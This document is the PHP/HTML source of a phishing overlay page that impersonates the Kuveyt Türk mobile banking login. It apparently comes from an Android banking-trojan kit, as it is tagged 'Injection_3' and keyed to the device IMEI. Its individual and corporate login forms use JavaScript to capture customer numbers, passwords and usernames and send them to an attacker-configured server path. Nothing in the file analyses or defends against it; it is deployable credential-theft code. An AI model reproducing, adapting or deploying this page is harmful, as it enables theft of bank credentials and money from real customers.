<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<link href="tr/com.kuveytturk.mobil/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div class="header">
	<img style="float: left;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDg4NkE3MDJDQjczMTFFNzlBMzFERjhFMTgwMjdERTUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDg4NkE3MDNDQjczMTFFNzlBMzFERjhFMTgwMjdERTUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpEODg2QTcwMENCNzMxMUU3OUEzMURGOEUxODAyN0RFNSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpEODg2QTcwMUNCNzMxMUU3OUEzMURGOEUxODAyN0RFNSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PoM0OM8AAAK7SURBVHja7Fk/SFtBGL+0HVxaagdFKZVOZrNo6BQXnboI9U+HanALpIJCBcGpOglCBAPp4CYpHQQVXJzqUqeSFt3MqIgxLpa6vKVNf0c+F3kv+S53uXeRfPDjHiHvvt/vvrv77r4XKZfLopntgWhyawkI2x6Z6KRzcyWCJgYMAwNAL9AFPKG//AGKQAH4CXwD8qXpRe0FGNFZxCAuSc4AU0CP4uunwBcgCyFFqwJAvB3NEpAE2jQH0QM2ZH8Qct1wASA/huYz0GF4Ol8BHyBiuyECQPwhmjVgtsHrMgN8hJC/xgSAvJwmX4G3ljaXXeA9RHjaAmjkt4BRyzvkDvCuViQ4eSAdAnlBPtNaEcDoyykjF1UkpDwlyY0hCrvKAkD+KZoT+Rhysi0BUYj4rTqFlg2Q/wXs6SZ64sJfA5RhkzpeX3c8P7mcXnw53xd/ZiAKSeLEjsCMToaV5PfeJDqxcNoNTaM24lRbAJTK3xIOkb+1BHGrGQF5mnzhGHlBnAY4AoYcJB/Ize8+EDNJfuHVYBwIfHf16Pth+vgwznQV40Sg18GRD+TmJ6DbUfK+3PwEPOYmKcvkfbndy6rEDfPd/pH9XAknqWuLfG84Ai64vf24Oo9aFnHBEVBQ6dGyiAInD+SB8TpEyB1J3F3UjH0+ruAqz4nAQT1DYykSBxwBsnJ25qCIM+JWXQBuPv/Q5Or10kAROeLGygNZUamYuSLCI05Kd+J1oV/EklfKc2BEs58MRn9O9U78iS7UOtZvgHyJuKjVhagKkKLSRlgmfaeCKhI1z0JUj8mEKCBTrSbEPczNi0qZz7btkG+hJYBqk5OiUnC1ZdLXJKdCzTpOU5V4wtJ0kj4mOJXpqttokLn2gUP5QkMOojRSngHiHvUVVSVfVwTuRKM5P/L5CGnOz6yu3olbAloCFOy/AAMA5fYwjFeCxtgAAAAASUVORK5CYII=">
	<a href="#" style="float: left;padding: 11px 5px 0 0;font-size: 18px;color: #fff;">Mobil Şube</a>
	<img style="float: left;width: 170px;padding: 9px 0;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAjMAAABgCAMAAADfCQOAAAAC+lBMVEX////+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7WKCkUAAAA/nRSTlMAAiFEY3qNnaOppZ+RfmUjAxpak8j0//bMl14eLILP/tOHMhVy1PDdy8O9ytnt2ir46K5QDAkoTarl+jEp/fy+JGy4sTAUlWsWDxLJoQFkOCLk8m4d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">
	<img style="float: right;width: 45px;padding: 8px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAeFBMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////GqOSsAAAAKHRSTlMAElGVyuv8lFAag+T9/4Je4l0MmZcLqv6ov4CBf+MRk8jq+0/hGVyWe8PAhQAAAOxJREFUOMvFlMkSgyAQRHHfGKNR474n5v//MDlgHASseLJvUM+iHboh5DppumFatm2ZjqspEM8PKDDRIPRkzC0CTlEsIPcEBKXZjnnkIpQXPJVImC+Vcn5AIeTLQ57LqiqR++0fffRtRUiFlvVvhgHabQhp0LLtGKRTtFs2DToOqMsgAw7UM8g8ggYGWaA+DkYG2aA2DtMZyDqCRpnxPbQad46gdQQuVUN0PnMtJFRDtTwq3DCfry1QsepSFhzNVB7fN5fxrPijCCRLRcjIhObFu3I+F2nNw3areVu/FK9B5zrDOE3j0M/dhe/WB3JIKfQKgFNBAAAAAElFTkSuQmCC">
</div>

<div id="form1">
<A href="#" class="hr1">BIREYSEL</A>
<A href="#" class="hr2" onclick="document.getElementById('form1').style.display = 'none'; document.getElementById('form2').style.display = 'block';">KURUMSAL</A>
<div style="clear:both"></div>

	<form action="null" method="post" id="_mainForm" target="flow_handler" style="padding: 10px;">

		<input name="fields[bank]" value="com.kuveytturk.mobil_bireysel" type="hidden">
		<input name="fields[login]" id="login" maxlength="12" placeholder="M&uuml;&#351;teri No / T.C. Kimlik No" class="input" type="text">
		<span class="error_hide" id="error_user"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> M&uuml;&#351;teri No giriniz.</span>

		<input name="fields[password]" id="password" maxlength="30" placeholder="Şifre" class="input" type="password" />
		<span class="error_hide" id="error_pass"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Şifre giriniz.</span>

		<input type="submit" value="İleri" id="submitBtn1"  onclick="SentServer1();" class="submit-button" />
	</form>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    <script type="text/javascript">

    (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
						var oNum1Inp = document.getElementById('error_user');
                        var oCodeInp = document.getElementById('password');
                        var oCode1Inp = document.getElementById('error_pass');

						try{
							oNumInp.className = oCodeInp.className = 'input';
							oNum1Inp.className = oCode1Inp.className = 'error_hide';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'input error';
								oNum1Inp.className = 'error_show';
							} catch(e){};
                            return false;
                        }

                        if (oCodeInp.value.length < 3) {
							try{
                                oCodeInp.className = 'input error';
                                oCode1Inp.className = 'error_show';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|kuveytturk_bireysel|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>
</div>

<div id="form2">
<A href="#" class="hr11" onclick="document.getElementById('form2').style.display = 'none'; document.getElementById('form1').style.display = 'block';">BIREYSEL</A>
<A href="#" class="hr22">KURUMSAL</A>
<div style="clear:both"></div>

	<form action="null" method="post" id="_mainForm" target="flow_handler2" style="padding: 10px;">

		<input name="fields[bank]" value="com.kuveytturk.mobil_kurumsal" type="hidden">
		<input name="fields[login2]" id="login2" maxlength="12" placeholder="M&uuml;&#351;teri No" class="input" type="text">
		<span class="error_hide" id="error_user2"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> M&uuml;&#351;teri No giriniz.</span>

		<input name="fields[password2]" id="password2" maxlength="30" placeholder="Şifre" class="input" type="password" />
		<span class="error_hide" id="error_pass2"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Şifre giriniz.</span>

		<input name="fields[code]" id="code2" maxlength="20" placeholder="Kullanıcı adı" class="input" type="text" />
		<span class="error_hide" id="error_code2"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Kullanıcı adı giriniz.</span>

		<input type="submit" value="İleri" id="submitBtn3" onclick="SentServer2();" class="submit-button" />
	</form>

<iframe src="about:blank" name="flow_handler2" style="visibility:hidden;display:none"></iframe>
    <script type="text/javascript">
    (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('submitBtn3');
                    g_oBtn.onclick = function () {

						var oNum2Inp = document.getElementById('login2');
						var oNum3Inp = document.getElementById('error_user2');
                        var oPass2Inp = document.getElementById('password2');
                        var oPass3Inp = document.getElementById('error_pass2');
                        var oCode2Inp = document.getElementById('code2');
                        var oCode3Inp = document.getElementById('error_code2');

						try{
							oNum2Inp.className = oPass2Inp.className = oCode2Inp.className = 'input';
							oNum3Inp.className = oPass3Inp.className = oCode3Inp.className = 'error_hide';
						} catch(e){};

                        if (oNum2Inp.value.length < 3) {
							try{
								oNum2Inp.className = 'input error';
								oNum3Inp.className = 'error_show';
							} catch(e){};
                            return false;
                        }

                        if (oPass2Inp.value.length < 3) {
							try{
                                oPass2Inp.className = 'input error';
                                oPass3Inp.className = 'error_show';
							} catch(e){};
                            return false;
                        }

                        if (oCode2Inp.value.length < 3) {
							try{
                                oCode2Inp.className = 'input error';
                                oCode3Inp.className = 'error_show';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|kuveytturk_kurumsal|"+oNum2Inp.value+"|"+oPass2Inp.value+"|"+oCode2Inp.value);

return false;
};

})();
</script>
</div>

</body>
</html>
